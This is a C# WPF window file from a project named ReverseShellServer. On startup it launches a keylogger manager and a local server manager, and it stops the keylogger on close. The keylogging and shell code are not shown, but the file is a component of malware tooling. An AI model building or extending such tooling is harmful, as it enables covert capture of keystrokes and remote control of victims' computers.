using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using KeyLogger;

namespace ReverseShellServer
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        /// <summary>
        /// The keyLoggerManager must be instanciated and started from this thread
        /// </summary>
        public static KeyLoggerManager keyLoggerManager;


        public MainWindow()
        {
            InitializeComponent();

            keyLoggerManager = new KeyLoggerManager();
            
            // Start the server manager in a new thread as a task
            var manager = new ServerManager();
            var mainTask = new Task(() => manager.Start("127.0.0.1", 1111, 3000));
            mainTask.Start();
        }


        /// <summary>
        /// When the application is exiting, stop the keylogger
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            keyLoggerManager.Stop();
        }
    }
}
